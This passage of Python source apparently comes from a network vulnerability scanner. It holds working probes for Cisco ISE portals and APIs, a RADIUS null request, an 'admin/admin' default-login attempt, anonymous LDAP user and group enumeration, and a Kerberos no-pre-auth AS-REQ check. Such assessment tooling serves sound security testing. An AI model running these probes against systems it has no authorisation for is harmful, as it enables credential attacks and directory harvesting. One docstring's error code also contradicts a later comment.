    if status in (200, 400, 401):
        findings.append({
            'severity': 'HIGH',
            'title':    'PXGRID_CONTROL_REACHABLE',
            'detail':   f'GET /pxgrid/control/AccountCreate returned HTTP {status} — control REST endpoint live',
            'host':     host,
            'port':     port,
        })

    # 3. AccountActivate — accountState field leak
    status, body = _post_json('/pxgrid/control/AccountActivate', {})
    if status is not None and b'accountState' in body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'PXGRID_ACCOUNT_STATE_LEAKED',
            'detail':   (
                f'POST /pxgrid/control/AccountActivate returned accountState '
                f'without auth: {body[:300].decode(errors="replace")}'
            ),
            'host':     host,
            'port':     port,
        })

    # 4. Session pub/sub topic — unauth data read
    status, body = _get('/pxgrid/ise/pub/session')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'PXGRID_SESSION_DATA_UNAUTH',
            'detail':   (
                f'GET /pxgrid/ise/pub/session returned session data without auth: '
                f'{body[:300].decode(errors="replace")}'
            ),
            'host':     host,
            'port':     port,
        })

    return findings


def probe_ise_guest_portal(host: str, port: int = 8443, timeout: float = 5.0) -> list:
    """
    Standalone guest/sponsor portal probe using stdlib only.

    Targets PortalSetup.action (portal exposure), the sponsor account API,
    the hotspot-portal config endpoint, and the ERS guest-user REST resource.
    All probes are unauthenticated.

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _get(h: str, p: int, path: str):
        try:
            req = urllib.request.Request(f'https://{h}:{p}{path}')
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b''
        except Exception:
            return None, b''

    def _post_json(h: str, p: int, path: str, payload):
        try:
            data = json.dumps(payload).encode()
            req = urllib.request.Request(
                f'https://{h}:{p}{path}', data=data,
                headers={'Content-Type': 'application/json'},
                method='POST',
            )
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(4096)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    # 1. Guest portal setup page — distinct from /portal/ checked in probe_guest_portals
    status, _ = _get(host, port, '/portal/PortalSetup.action')
    if status in (200, 302):
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_GUEST_PORTAL_EXPOSED',
            'detail':   f'GET https://{host}:{port}/portal/PortalSetup.action returned HTTP {status}',
            'host':     host,
            'port':     port,
        })

    # 2. Sponsor account list — unauth REST dump
    status, body = _get(host, port, '/guestapi/api/v1/sponsor/accounts')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_SPONSOR_ACCOUNTS_UNAUTH',
            'detail':   (
                f'Sponsor account list returned without auth: '
                f'{body[:300].decode(errors="replace")}'
            ),
            'host':     host,
            'port':     port,
        })

    # 3. Hotspot portal config — unauth
    status, body = _get(host, port, '/api/v1/hotspot-portal')
    if status == 200 and body:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_HOTSPOT_CONFIG_UNAUTH',
            'detail':   (
                f'Hotspot portal config returned without auth: '
                f'{body[:300].decode(errors="replace")}'
            ),
            'host':     host,
            'port':     port,
        })

    # 4. ERS guest-user resource — unauth POST to dedicated ERS port 9060
    status, body = _post_json(host, 9060, '/ers/config/guestuser', {})
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_GUEST_USERS_UNAUTH',
            'detail':   (
                f'ERS /ers/config/guestuser POST returned guest data without auth: '
                f'{body[:300].decode(errors="replace")}'
            ),
            'host':     host,
            'port':     9060,
        })

    return findings


def probe_ise_radius_endpoint(host: str, port: int = 1812, timeout: float = 5.0) -> list:
    """
    Standalone RADIUS endpoint probe using stdlib socket only.

    Sends a minimal RFC 2865 Access-Request (Code=1) with no attributes and a
    zero authenticator — the bare 20-byte header.  Any response from the server
    confirms the RADIUS service is live and reachable.  Response code determines
    severity: an Access-Accept (Code=2) on an empty request with no credentials
    means the server accepted unauthenticated or null-credential authentication,
    which is critical.  An Access-Reject (Code=3) confirms service but is
    informational.

    Falls back to a TCP connect on the same port when UDP produces no response;
    many ISE deployments filter UDP but leave the port reachable for management
    tooling, and a TCP open confirms the surface even without a RADIUS response.

    Distinct from _radius_probe_udp (which sends full User-Name / User-Password
    / NAS-IP attributes with proper MD5 shared-secret authenticator) and from
    probe_ise_radius_coa (which targets the CoA/Disconnect port UDP/3799).

    Source: RFC 2865 s4 (packet format); ASA All-in-One 3e ch07 (RADIUS
    client/server model, Access-Request / Access-Accept / Access-Reject
    sequence, UDP/1812 default auth port).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []

    # Minimal Access-Request: Code=1, ID=1, Length=20, Authenticator=\x00*16
    # No attributes — intentionally omits User-Name / User-Password / NAS-IP.
    # A real NAS would include them; the absence tests whether ISE responds at
    # all and whether it erroneously issues an Accept on a null request.
    pkt = struct.pack('!BBH16s', 1, 1, 20, b'\x00' * 16)

    udp_responsive = False
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(pkt, (host, port))
        data, _ = sock.recvfrom(4096)
        sock.close()
        udp_responsive = True

        resp_code = data[0] if data else 0

        # Any response — service confirmed live
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_RADIUS_RESPONDS',
            'detail':   (
                f'RADIUS service on UDP/{port} accepted the minimal Access-Request '
                f'(Code=1, no attributes) and responded with Code={resp_code} '
                f'({{{2: "Access-Accept", 3: "Access-Reject", 11: "Access-Challenge"}.get(resp_code, "unknown")}})'
            ),
            'host':     host,
            'port':     port,
        })

        if resp_code == 2:
            # Access-Accept on a packet with no credentials
            findings.append({
                'severity': 'CRITICAL',
                'title':    'ISE_RADIUS_ACCESS_ACCEPT',
                'detail':   (
                    f'RADIUS Access-Accept (Code=2) returned for an empty Access-Request '
                    f'with no User-Name or User-Password attributes — RADIUS accepted '
                    f'the request without credentials.  Possible null-auth bypass or '
                    f'misconfigured allow-all policy.'
                ),
                'host':     host,
                'port':     port,
            })
        elif resp_code == 3:
            findings.append({
                'severity': 'INFO',
                'title':    'ISE_RADIUS_ACCESS_REJECT',
                'detail':   (
                    f'RADIUS Access-Reject (Code=3) on UDP/{port} — service is '
                    f'responding and correctly rejected the credential-less request.  '
                    f'Service is confirmed live; shared-secret brute is the next step.'
                ),
                'host':     host,
                'port':     port,
            })

    except Exception:
        pass

    # TCP fallback — ISE management plane may accept TCP on 1812 for status
    # checks even when UDP is filtered.  This does not speak RADIUS; it is a
    # pure liveness signal.
    if not udp_responsive:
        try:
            with socket.create_connection((host, port), timeout=timeout):
                findings.append({
                    'severity': 'MEDIUM',
                    'title':    'ISE_RADIUS_TCP_OPEN',
                    'detail':   (
                        f'TCP/{port} accepts connections (RADIUS port) but UDP produced '
                        f'no response — UDP may be filtered upstream.  TCP open confirms '
                        f'the RADIUS service surface; use a NAD-positioned vantage for '
                        f'UDP probe.'
                    ),
                    'host':     host,
                    'port':     port,
                })
        except Exception:
            pass

    return findings


def probe_ise_admin_portal(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """
    Standalone ISE administration portal probe using stdlib urllib.request + ssl.

    Checks four distinct surfaces on the ISE admin interface:
      1. /admin/           — portal landing page; accessibility without auth is HIGH.
      2. /admin/login.jsp  — admin login form; reachability is HIGH (interface exposed).
      3. POST /admin/login.jsp with username=admin&password=admin (form-encoded) —
         redirect to the management dashboard indicates CRITICAL default credentials.
      4. GET /ers/config/internaluser — ERS internal user database without auth;
         success is CRITICAL (user database exposed to unauthenticated callers).

    Distinct from:
      - probe_ise_admin_api  (class method) — targets MnT XML API /admin/API/mnt/*
      - probe_mnt_version    (class method) — targets /admin/API/mnt/Version
      - probe_ers_sdk        (class method) — targets /ers/sdk/
      - enumerate_ers        (class method) — ERS enumeration with valid credentials

    Source: ISE 3.1 Install Guide ch05 post-install (admin portal defaults, first-
    login flow); ASA All-in-One 3e ch07 (ISE as RADIUS back-end, admin
    credential exposure chain).

    Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f'https://{host}:{port}'

    def _get(path: str):
        try:
            req = urllib.request.Request(f'{base}{path}')
            req.add_header('Accept', 'text/html,application/xhtml+xml,application/json')
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(4096), dict(r.headers), r.url
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(4096)
            except Exception:
                pass
            return e.code, body, {}, ''
        except Exception:
            return None, b'', {}, ''

    def _post_form(path: str, payload: str):
        """POST application/x-www-form-urlencoded and follow redirects manually."""
        try:
            data = payload.encode('utf-8')
            req = urllib.request.Request(f'{base}{path}', data=data, method='POST')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            req.add_header('Accept', 'text/html,application/xhtml+xml')
            # urllib follows redirects by default; capture final URL
            with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
                return r.status, r.read(4096), r.url
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(4096)
            except Exception:
                pass
            return e.code, body, ''
        except Exception:
            return None, b'', ''

    # 1. Admin portal landing page
    status, body, headers, final_url = _get('/admin/')
    if status in (200, 302, 301):
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_ADMIN_PORTAL_EXPOSED',
            'detail':   (
                f'ISE administration interface is accessible at {base}/admin/ '
                f'(HTTP {status}).  The admin portal should not be reachable '
                f'from untrusted networks; exposure permits credential brute-force '
                f'and UI-layer attack surface.'
            ),
            'host':     host,
            'port':     port,
        })

    # 2. Admin login page
    status, body, headers, final_url = _get('/admin/login.jsp')
    if status == 200:
        findings.append({
            'severity': 'HIGH',
            'title':    'ISE_ADMIN_LOGIN_PAGE',
            'detail':   (
                f'ISE admin login form reachable at {base}/admin/login.jsp '
                f'(HTTP 200).  Login page exposure confirms the management '
                f'interface is network-accessible; ISE recommends restricting '
                f'admin access to an out-of-band management network.'
            ),
            'host':     host,
            'port':     port,
        })

    # 3. Default admin credentials via form POST
    # urllib follows the post-login redirect; a 200 on a dashboard URI or body
    # containing ISE dashboard markers indicates successful authentication.
    status, body, final_url = _post_form(
        '/admin/login.jsp',
        'username=admin&password=admin&rememberme=on',
    )
    body_text = body.decode('utf-8', errors='replace')
    dashboard_indicators = ('dashboard', 'ISE Home', 'ise-home', 'adminDashboard',
                             'logout', '/admin/main.jsp')
    if status == 200 and any(ind.lower() in body_text.lower() for ind in dashboard_indicators):
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_DEFAULT_ADMIN_CREDS',
            'detail':   (
                f'admin/admin accepted on {base}/admin/login.jsp — ISE administration '
                f'dashboard returned after POST (HTTP {status}, landed on '
                f'{final_url or "unknown"}).  Full administrative access to the '
                f'policy engine including NAD credentials, identity stores, and '
                f'RADIUS policy configuration.'
            ),
            'host':     host,
            'port':     port,
        })

    # 4. ERS internal user database without credentials
    # The ERS API requires Basic auth in a hardened deployment; unauthenticated
    # access exposes the full local identity store (usernames, password hashes,
    # group memberships) used for RADIUS authentication decisions.
    status, body, headers, final_url = _get('/ers/config/internaluser')
    if status == 200 and body:
        findings.append({
            'severity': 'CRITICAL',
            'title':    'ISE_INTERNAL_USERS_UNAUTH',
            'detail':   (
                f'ERS /ers/config/internaluser returned HTTP 200 without '
                f'authentication — ISE internal user database (RADIUS identity '
                f'store) is exposed.  Response preview: '
                f'{body[:300].decode("utf-8", errors="replace")}'
            ),
            'host':     host,
            'port':     port,
        })

    return findings


# ---------------------------------------------------------------------------
# LDAP directory exposure
# ---------------------------------------------------------------------------
def probe_ldap_directory_exposure(host: str, port: int = 389, timeout: float = 10.0) -> list:
    """Probe for unauthenticated LDAP directory access on port 389 and LDAPS on 636.

    Checks:
    - TCP reachability on 389 (plain LDAP) and 636 (LDAPS)
    - Anonymous simple bind (bindRequest version=3, name='', credentials='')
    - Root DSE search for namingContexts (baseObject='', scope=0, filter=objectClass=*)

    All BER encoding is performed inline with struct/bytes — no third-party deps.
    Returns list of {severity, title, detail, host, port} dicts.
    """
    findings: list = []

    # ------------------------------------------------------------------
    # BER helpers (inline — no ldap3 / pyasn1 dependency)
    # ------------------------------------------------------------------
    def _ber_length(n: int) -> bytes:
        """Encode ASN.1 length in DER/BER short or long form."""
        if n < 0x80:
            return bytes([n])
        if n < 0x100:
            return bytes([0x81, n])
        return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])

    def _ber_tlv(tag: int, value: bytes) -> bytes:
        return bytes([tag]) + _ber_length(len(value)) + value

    def _ber_seq(value: bytes) -> bytes:
        return _ber_tlv(0x30, value)  # SEQUENCE

    def _ber_int(n: int) -> bytes:
        """Encode a small non-negative integer as BER INTEGER."""
        raw = n.to_bytes((n.bit_length() + 8) // 8, 'big') if n else b'\x00'
        return _ber_tlv(0x02, raw)

    def _ber_octetstr(s: str) -> bytes:
        return _ber_tlv(0x04, s.encode())

    def _ber_enum(n: int) -> bytes:
        """BER ENUMERATED — same encoding as INTEGER, different tag."""
        raw = n.to_bytes((n.bit_length() + 8) // 8, 'big') if n else b'\x00'
        return _ber_tlv(0x0a, raw)

    def _ldap_msg(msg_id: int, operation: bytes) -> bytes:
        """Wrap an LDAP protocol operation in a LDAPMessage envelope."""
        content = _ber_int(msg_id) + operation
        return _ber_seq(content)

    def _build_bind_request(msg_id: int = 1) -> bytes:
        """Anonymous simple bind: version=3, name='', authentication=simple ''."""
        version   = _ber_int(3)
        name      = _ber_octetstr('')
        auth_simple = _ber_tlv(0x80, b'')  # [0] IMPLICIT OCTET STRING — simple auth
        bind_req  = _ber_tlv(0x60, version + name + auth_simple)  # [APPLICATION 0]
        return _ldap_msg(msg_id, bind_req)

    def _build_search_request(msg_id: int, base: str, ldap_filter: bytes) -> bytes:
        """Build a SearchRequest for base-level scope requesting named attributes."""
        base_obj   = _ber_octetstr(base)
        scope      = _ber_enum(0)          # baseObject
        deref      = _ber_enum(0)          # neverDerefAliases
        size_limit = _ber_int(10)
        time_limit = _ber_int(5)
        types_only = _ber_tlv(0x01, b'\x00')  # BOOLEAN FALSE
        # ldap_filter already BER-encoded by caller
        attrs      = _ber_seq(                 # AttributeDescriptionList
            _ber_octetstr('namingContexts') +
            _ber_octetstr('subschemaSubentry') +
            _ber_octetstr('supportedLDAPVersion')
        )
        search_req = _ber_tlv(
            0x63,  # [APPLICATION 3] SearchRequest
            base_obj + scope + deref + size_limit + time_limit +
            types_only + ldap_filter + attrs
        )
        return _ldap_msg(msg_id, search_req)

    def _objectclass_filter(cls: str = '*') -> bytes:
        """Build BER for (objectClass=<cls>) present or equality filter."""
        if cls == '*':
            # Present filter: (objectClass=*) — tag 0x87
            return _ber_tlv(0x87, b'objectClass')
        # Equality match: (objectClass=<cls>) — tag 0xa3
        attr  = _ber_octetstr('objectClass')
        value = _ber_octetstr(cls)
        return _ber_tlv(0xa3, attr[1 + len(_ber_length(len('objectClass'.encode()))):] +
                         value)

    def _tcp_connect(p: int) -> 'socket.socket | None':
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, p))
            return s
        except Exception:
            return None

    def _recv_response(s: 'socket.socket', max_bytes: int = 4096) -> bytes:
        try:
            s.settimeout(timeout)
            data = b''
            while len(data) < max_bytes:
                chunk = s.recv(min(1024, max_bytes - len(data)))
                if not chunk:
                    break
                data += chunk
                # Stop once we have a plausible complete BER TLV
                if len(data) >= 2:
                    needed = data[1] if data[1] < 0x80 else (
                        int.from_bytes(data[2:2 + (data[1] & 0x7f)], 'big')
                        + 2 + (data[1] & 0x7f)
                    )
                    if len(data) >= needed:
                        break
        except Exception:
            pass
        return data

    def _ldap_result_code(response: bytes) -> 'int | None':
        """Extract the resultCode from a bindResponse or searchResDone envelope.

        LDAPMessage ::= SEQUENCE { messageID INTEGER, protocolOp CHOICE { ... } }
        BindResponse ::= [APPLICATION 1] SEQUENCE { resultCode ENUMERATED, ... }
        """
        try:
            if len(response) < 6:
                return None
            # Skip outer SEQUENCE tag + length
            idx = 1
            if response[idx] >= 0x80:
                idx += (response[idx] & 0x7f) + 1
            else:
                idx += 1
            # Skip messageID TLV
            idx += 1  # INTEGER tag
            id_len = response[idx]; idx += 1
            idx += id_len
            # protocolOp tag — APPLICATION 1 = bindResponse (0x61)
            op_tag = response[idx]
            if op_tag not in (0x61, 0x65):  # bindResponse or searchResDone
                return None
            idx += 1
            if response[idx] >= 0x80:
                idx += (response[idx] & 0x7f) + 1
            else:
                idx += 1
            # resultCode ENUMERATED
            if response[idx] != 0x0a:
                return None
            idx += 1
            rc_len = response[idx]; idx += 1
            return int.from_bytes(response[idx:idx + rc_len], 'big')
        except Exception:
            return None

    def _has_search_entry(response: bytes) -> bool:
        """Return True if the response contains a SearchResultEntry (tag 0x64)."""
        return b'\x64' in response

    # ------------------------------------------------------------------
    # Step 1: plain LDAP port 389
    # ------------------------------------------------------------------
    sock389 = _tcp_connect(389)
    if sock389 is not None:
        findings.append({
            'severity': 'HIGH',
            'title':    'LDAP_PORT_OPEN',
            'detail':   (
                f'LDAP directory service accessible on {host}:389 — '
                f'port open and accepting TCP connections.'
            ),
            'host':     host,
            'port':     389,
        })

        # Anonymous bind
        try:
            bind_pkt = _build_bind_request(msg_id=1)
            sock389.sendall(bind_pkt)
            resp = _recv_response(sock389)
            rc = _ldap_result_code(resp)
            if rc == 0:
                findings.append({
                    'severity': 'CRITICAL',
                    'title':    'LDAP_ANONYMOUS_BIND',
                    'detail':   (
                        f'LDAP directory on {host}:389 allows anonymous bind without '
                        f'credentials (resultCode=0 SUCCESS).  An unauthenticated '
                        f'attacker can enumerate directory objects including users, '
                        f'groups, and network policy data.'
                    ),
                    'host':     host,
                    'port':     389,
                })

                # Root DSE namingContexts search
                search_pkt = _build_search_request(
                    msg_id=2,
                    base='',
                    ldap_filter=_objectclass_filter('*'),
                )
                sock389.sendall(search_pkt)
                sresp = _recv_response(sock389, max_bytes=8192)
                if _has_search_entry(sresp):
                    findings.append({
                        'severity': 'CRITICAL',
                        'title':    'LDAP_NAMING_CONTEXTS_UNAUTH',
                        'detail':   (
                            f'LDAP root DSE on {host}:389 returns namingContexts '
                            f'entries via anonymous search (scope=baseObject, '
                            f'filter=objectClass=*).  Directory partition layout '
                            f'enumerable without credentials — baseline for full '
                            f'directory reconnaissance.'
                        ),
                        'host':     host,
                        'port':     389,
                    })
        except Exception:
            pass
        finally:
            try:
                sock389.close()
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Step 2: LDAPS port 636
    # ------------------------------------------------------------------
    sock636 = _tcp_connect(636)
    if sock636 is not None:
        findings.append({
            'severity': 'HIGH',
            'title':    'LDAPS_PORT_OPEN',
            'detail':   (
                f'LDAP over TLS accessible on {host}:636 — '
                f'port open and accepting TCP connections.'
            ),
            'host':     host,
            'port':     636,
        })
        try:
            sock636.close()
        except Exception:
            pass

    return findings


# ---------------------------------------------------------------------------
# LDAP null-base anonymous enumeration
# ---------------------------------------------------------------------------
def probe_ldap_null_base_search(host: str, port: int = 389, timeout: float = 10.0) -> list:
    """After anonymous bind, search with base='' for AD object classes.

    Checks:
    - (objectClass=person)   -> user enumeration
    - (objectClass=computer) -> machine account enumeration
    - (objectClass=group)    -> group membership enumeration

    BER-encoded inline. Returns list of {severity, title, detail, host, port}.
    """
    findings: list = []

    # ------------------------------------------------------------------
    # Minimal BER / LDAP helpers (self-contained, no shared state with
    # probe_ldap_directory_exposure — each probe function stands alone)
    # ------------------------------------------------------------------
    def _bl(n: int) -> bytes:
        if n < 0x80:
            return bytes([n])
        if n < 0x100:
            return bytes([0x81, n])
        return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])

    def _tlv(tag: int, val: bytes) -> bytes:
        return bytes([tag]) + _bl(len(val)) + val

    def _seq(val: bytes) -> bytes:
        return _tlv(0x30, val)

    def _int(n: int) -> bytes:
        raw = n.to_bytes((n.bit_length() + 8) // 8, 'big') if n else b'\x00'
        return _tlv(0x02, raw)

    def _enum(n: int) -> bytes:
        raw = n.to_bytes((n.bit_length() + 8) // 8, 'big') if n else b'\x00'
        return _tlv(0x0a, raw)

    def _ostr(s: str) -> bytes:
        return _tlv(0x04, s.encode())

    def _ldap_msg(mid: int, op: bytes) -> bytes:
        return _seq(_int(mid) + op)

    def _bind_anon(mid: int = 1) -> bytes:
        req = _tlv(0x60, _int(3) + _ostr('') + _tlv(0x80, b''))
        return _ldap_msg(mid, req)

    def _eq_filter(attr: str, value: str) -> bytes:
        """BER equality match filter: (attr=value), tag 0xa3."""
        return _tlv(0xa3, _ostr(attr) + _ostr(value))

    def _search_req(mid: int, base: str, filt: bytes, attrs: list) -> bytes:
        attr_seq = _seq(b''.join(_ostr(a) for a in attrs))
        req = _tlv(
            0x63,
            _ostr(base) + _enum(2) +  # scope=wholeSubtree
            _enum(0) +                 # derefAliases=neverDerefAliases
            _int(50) +                 # sizeLimit
            _int(10) +                 # timeLimit
            _tlv(0x01, b'\x00') +      # typesOnly=FALSE
            filt + attr_seq
        )
        return _ldap_msg(mid, req)

    def _recv(s: 'socket.socket', maxb: int = 8192) -> bytes:
        data = b''
        try:
            s.settimeout(timeout)
            while len(data) < maxb:
                chunk = s.recv(min(2048, maxb - len(data)))
                if not chunk:
                    break
                data += chunk
                if len(data) >= 2:
                    if data[1] < 0x80:
                        needed = data[1] + 2
                    else:
                        ll = data[1] & 0x7f
                        needed = int.from_bytes(data[2:2 + ll], 'big') + 2 + ll
                    if len(data) >= needed:
                        break
        except Exception:
            pass
        return data

    def _bind_ok(resp: bytes) -> bool:
        """Return True if LDAPMessage contains a bindResponse with resultCode=0."""
        try:
            if len(resp) < 7:
                return False
            idx = 1
            idx += 1 if resp[idx] < 0x80 else (resp[idx] & 0x7f) + 1
            # skip messageID
            idx += 1
            ml = resp[idx]; idx += 1 + ml
            # protocolOp
            if resp[idx] != 0x61:
                return False
            idx += 1
            idx += 1 if resp[idx] < 0x80 else (resp[idx] & 0x7f) + 1
            # resultCode ENUMERATED
            if resp[idx] != 0x0a:
                return False
            idx += 1
            rcl = resp[idx]; idx += 1
            return int.from_bytes(resp[idx:idx + rcl], 'big') == 0
        except Exception:
            return False

    def _has_entry(resp: bytes) -> bool:
        """Return True if response contains SearchResultEntry (APPLICATION 4 = 0x64)."""
        return b'\x64' in resp

    # ------------------------------------------------------------------
    # Establish connection and anonymous bind
    # ------------------------------------------------------------------
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
    except Exception:
        return findings

    try:
        sock.sendall(_bind_anon(1))
        bresp = _recv(sock)
        if not _bind_ok(bresp):
            return findings

        # Search 1: user objects
        sock.sendall(_search_req(2, '', _eq_filter('objectClass', 'person'),
                                 ['sAMAccountName', 'cn', 'mail', 'userPrincipalName']))
        uresp = _recv(sock, maxb=16384)
        if _has_entry(uresp):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'LDAP_USER_ENUM_ANON',
                'detail':   (
                    f'User objects (objectClass=person) enumerable via anonymous LDAP '
                    f'search on {host}:{port} with base="" scope=wholeSubtree.  '
                    f'Attacker can harvest usernames, email addresses, and UPNs '
                    f'without any credentials — direct input for password-spray and '
                    f'phishing campaigns.'
                ),
                'host':     host,
                'port':     port,
            })

        # Search 2: computer accounts
        sock.sendall(_search_req(3, '', _eq_filter('objectClass', 'computer'),
                                 ['cn', 'dNSHostName', 'operatingSystem']))
        cresp = _recv(sock, maxb=16384)
        if _has_entry(cresp):
            findings.append({
                'severity': 'CRITICAL',
                'title':    'LDAP_COMPUTER_ENUM_ANON',
                'detail':   (
                    f'Computer accounts (objectClass=computer) enumerable via anonymous '
                    f'LDAP search on {host}:{port}.  Machine names, DNS hostnames, and '
                    f'OS versions exposed without authentication — enables AD '
                    f'reconnaissance and lateral movement target selection.'
                ),
                'host':     host,
                'port':     port,
            })

        # Search 3: group membership
        sock.sendall(_search_req(4, '', _eq_filter('objectClass', 'group'),
                                 ['cn', 'member', 'description']))
        gresp = _recv(sock, maxb=16384)
        if _has_entry(gresp):
            findings.append({
                'severity': 'HIGH',
                'title':    'LDAP_GROUP_ENUM_ANON',
                'detail':   (
                    f'Group objects (objectClass=group) enumerable via anonymous LDAP '
                    f'search on {host}:{port}.  Group membership (including privileged '
                    f'groups such as Domain Admins) visible without authentication — '
                    f'exposes organizational structure and privilege hierarchy.'
                ),
                'host':     host,
                'port':     port,
            })

    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass

    return findings


# ---------------------------------------------------------------------------
# Kerberos exposure probe
# ---------------------------------------------------------------------------
def probe_kerberos_exposure(host: str, port: int = 88, timeout: float = 5.0) -> list:
    """Detect Kerberos authentication service exposure and pre-auth posture.

    Checks:
      - TCP/UDP port 88 reachability (HIGH)
      - AS-REQ without PA-DATA -> AS-REP received (no pre-auth) -> CRITICAL
      - AS-REQ without PA-DATA -> KDC-ERR-PREAUTH-REQUIRED (18) -> MEDIUM
      - TCP port 464 reachability for kpasswd (MEDIUM)

    Returns list of {severity, title, detail, host, port}.
    """
    import socket
    import struct

    findings: list = []

    # -----------------------------------------------------------------------
    # AS-REQ builder (anonymous principal, no PA-DATA)
    # Minimal KRB5 AS-REQ for 'anonymous@<host>' with no pre-auth data.
    # DER-encoded Kerberos message wrapped in a 4-byte TCP length prefix.
    # -----------------------------------------------------------------------
    def _asn1_tag(tag: int, content: bytes) -> bytes:
        length = len(content)
        if length < 0x80:
            return bytes([tag]) + bytes([length]) + content
        elif length < 0x100:
            return bytes([tag, 0x81, length]) + content
        else:
            return bytes([tag, 0x82]) + struct.pack('>H', length) + content

    def _int_val(n: int) -> bytes:
        if n == 0:
            return b'\x02\x01\x00'
        b = n.to_bytes((n.bit_length() + 8) // 8, 'big')
        return bytes([0x02, len(b)]) + b

    def _str_val(s: str, tag: int = 0x1b) -> bytes:
        enc = s.encode('ascii')
        return bytes([tag, len(enc)]) + enc

    def _build_as_req(realm: str) -> bytes:
        # pvno: INTEGER (5)
        pvno = _asn1_tag(0xa1, _int_val(5))
        # msg-type: INTEGER (10 = AS-REQ)
        msg_type = _asn1_tag(0xa2, _int_val(10))
        # req-body
        kdc_options = _asn1_tag(0xa0, b'\x03\x05\x00\x50\x80\x00\x00')
        cname_str = _asn1_tag(0xa0, _int_val(1)) + _asn1_tag(0xa1, _asn1_tag(0x30, _str_val('anonymous')))
        cname = _asn1_tag(0xa1, _asn1_tag(0x30, cname_str))
        realm_field = _asn1_tag(0xa2, _str_val(realm.upper()))
        sname_str = _asn1_tag(0xa0, _int_val(2)) + _asn1_tag(0xa1, _asn1_tag(0x30, _str_val('krbtgt') + _str_val(realm.upper())))
        sname = _asn1_tag(0xa3, _asn1_tag(0x30, sname_str))
        till = _asn1_tag(0xa5, b'\x18\x0f' + b'20370913024805Z')
        nonce = _asn1_tag(0xa7, _int_val(0x12345678))
        etype = _asn1_tag(0xa8, _asn1_tag(0x30, _int_val(18) + _int_val(17) + _int_val(23)))
        req_body_inner = kdc_options + cname + realm_field + sname + till + nonce + etype
        req_body = _asn1_tag(0xa4, _asn1_tag(0x30, req_body_inner))
        seq_inner = pvno + msg_type + req_body
        seq = _asn1_tag(0x30, seq_inner)
        app = _asn1_tag(0x6a, seq)
        return struct.pack('>I', len(app)) + app

    realm = host.upper()
    as_req = _build_as_req(realm)

    # -----------------------------------------------------------------------
    # Step 1: TCP port 88 reachability
    # -----------------------------------------------------------------------
    port88_open = False
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        port88_open = True
        findings.append({
            'severity': 'HIGH',
            'title':    'KERBEROS_PORT_OPEN',
            'detail':   (
                f'Kerberos authentication service is accessible on {host}:{port} (TCP). '
                f'Exposes authentication infrastructure to AS-REP roasting, Kerberoasting, '
                f'and brute-force attacks from unauthenticated network positions.'
            ),
            'host':     host,
            'port':     port,
        })

        # -------------------------------------------------------------------
        # Step 2: Send AS-REQ (no PA-DATA) and inspect response
        # -------------------------------------------------------------------
        sock.sendall(as_req)
        sock.settimeout(timeout)
        try:
            hdr = b''
            while len(hdr) < 4:
                chunk = sock.recv(4 - len(hdr))
                if not chunk:
                    break
                hdr += chunk
            if len(hdr) == 4:
                resp_len = struct.unpack('>I', hdr)[0]
                resp_len = min(resp_len, 65536)
                resp = b''
                while len(resp) < resp_len:
                    chunk = sock.recv(resp_len - len(resp))
                    if not chunk:
                        break
                    resp += chunk

                if resp:
                    # AS-REP application tag = 0x6b (APP 11)
                    # KRB-ERROR application tag = 0x7e (APP 30)
                    # KDC-ERR-PREAUTH-REQUIRED error code = 25 (0x19)
                    first_byte = resp[0] if resp else 0
                    if first_byte == 0x6b:
                        # Got an AS-REP — no pre-authentication required
                        findings.append({
                            'severity': 'CRITICAL',
                            'title':    'KERBEROS_NOPREAUTH',
                            'detail':   (
                                f'Kerberos KDC on {host}:{port} returned an AS-REP without '
                                f'requiring pre-authentication.  Attacker can request AS-REP '
                                f'for any account, harvest the encrypted TGT portion, and '
                                f'crack the account password offline (AS-REP Roasting / '
                                f'RFC 4120 pre-auth bypass).'
                            ),
                            'host':     host,
                            'port':     port,
                        })
                    elif first_byte == 0x7e:
                        # KRB-ERROR — check error code for PREAUTH-REQUIRED (25)
                        # error-code is encoded as INTEGER in the TLV stream
                        err_code = None
                        try:
                            # Walk the ASN.1 to find INTEGER tagged [6] (error-code field)
                            i = 0
                            while i < len(resp) - 3:
                                if resp[i] == 0xa6:
